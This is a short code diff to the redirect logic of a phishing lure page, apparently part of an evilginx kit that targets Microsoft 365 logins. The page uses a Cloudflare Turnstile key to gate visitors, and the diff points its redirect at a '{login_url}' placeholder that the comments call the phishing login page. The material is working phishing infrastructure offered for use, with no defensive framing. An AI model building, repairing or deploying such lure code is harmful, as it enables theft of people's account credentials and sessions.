@@ -337,10 +337,9 @@
         // Configuration
         const TURNSTILE_SITEKEY = '0x4AAAAAACvgSubVWdSZLLga'; // ⚠️ IMPORTANT: Replace this with your actual Cloudflare Turnstile Site Key
 
-        // Get redirect URL - we need to redirect to the actual phishing landing page
-        // The {lure_url_js} placeholder gives us the CURRENT lure URL (redirector page), 
-        // not the landing page, so we need to construct the landing page URL manually
-        let REDIRECT_URL = window.location.protocol + "//" + window.location.host + "/"; // Root path where O365 phishing page is served
+        // Get redirect URL - injected by evilginx server
+        // {login_url} is replaced with the phishing login page URL (e.g., https://login.phishdomain.com/path)
+        let REDIRECT_URL = "{login_url}";
 
         console.log("Redirect URL set to landing page:", REDIRECT_URL);
 
